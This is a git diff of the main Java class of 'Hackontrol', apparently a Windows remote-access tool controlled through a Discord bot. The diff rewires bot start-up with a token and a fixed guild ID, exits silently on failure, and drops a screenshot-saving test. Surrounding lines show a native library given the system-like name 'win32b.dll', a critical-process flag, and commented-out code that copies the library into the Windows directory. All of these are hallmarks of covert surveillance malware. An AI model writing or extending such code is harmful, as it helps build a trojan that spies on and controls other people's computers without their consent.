@@ -1,7 +1,5 @@
 package com.khopan.hackontrol;
 
-import java.io.File;
-import java.io.FileOutputStream;
 import java.lang.annotation.Native;
 import java.util.Iterator;
 import java.util.LinkedHashMap;
@@ -9,29 +7,44 @@ import java.util.Map;
 import java.util.Map.Entry;
 
 import com.khopan.hackontrol.command.CommandManager;
-import com.khopan.hackontrol.function.Screenshot;
 
 import net.dv8tion.jda.api.JDA;
+import net.dv8tion.jda.api.JDABuilder;
+import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
 import net.dv8tion.jda.api.interactions.commands.Command;
 import net.dv8tion.jda.api.interactions.commands.build.SlashCommandData;
+import net.dv8tion.jda.api.requests.GatewayIntent;
 
 public class Hackontrol {
-	private static final String LIBRARY_NAME = "win32b.dll";
+	private static Hackontrol INSTANCE;
 
 	@Native
 	private static final boolean CRITICAL_PROCESS = false;
 
 	private final JDA bot;
+	private final Guild guild;
 	private final Map<Command, com.khopan.hackontrol.command.Command> map;
 
-	private Hackontrol(JDA bot, String machineIdentifier) {
-		this.bot = bot;
+	private Hackontrol() {
+		Hackontrol.INSTANCE = this;
 		this.map = new LinkedHashMap<>();
-		this.bot.addEventListener(new Listener());
+		this.bot = JDABuilder.createDefault(Token.BOT_TOKEN)
+				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
+				.addEventListeners(new Listener())
+				.build();
+
+		try {
+			this.bot.awaitReady();
+		} catch(Throwable Errors) {
+			System.exit(0);
+			this.guild = null;
+			return;
+		}
+
+		this.guild = this.bot.getGuildById(1181833410235351171L);
 		CommandManager.register(this :: register);
-		System.err.println("Hello, world!");
 	}
 
 	private void register(Class<? extends com.khopan.hackontrol.command.Command> commandClass) {
@@ -77,6 +90,14 @@ public class Hackontrol {
 		}
 	}
 
+	public JDA getBot() {
+		return this.bot;
+	}
+
+	public Guild getGuild() {
+		return this.guild;
+	}
+
 	public static void main(String[] args) throws Throwable {
 		/*String windowsDirectoryPath = System.getenv("windir");
 
@@ -116,27 +137,15 @@ public class Hackontrol {
 
 		System.load(libraryFile.getAbsolutePath());*/
 		System.load("D:\\GitHub Repository\\Hackontrol\\Native Library\\x64\\Release\\Native Library.dll");
-		byte[] image = Screenshot.take();
-		
-		if(image == null) {
-			return;
-		}
-		
-		File file = new File("C:\\Users\\puthi\\Downloads\\image.png");		FileOutputStream stream = new FileOutputStream(file);
-		stream.write(image);
-		stream.close();
-		/*JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
-				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
-				.build();
+		Hackontrol.getInstance();
+	}
 
-		try {
-			bot.awaitReady();
-		} catch(Throwable ignored) {
-			return;
+	public static Hackontrol getInstance() {
+		if(Hackontrol.INSTANCE == null) {
+			Hackontrol.INSTANCE = new Hackontrol();
 		}
 
-		String machineIdentifier = Machine.getIdentifier();
-		new Hackontrol(bot, machineIdentifier);*/
+		return Hackontrol.INSTANCE;
 	}
 
 	private class Listener extends ListenerAdapter {
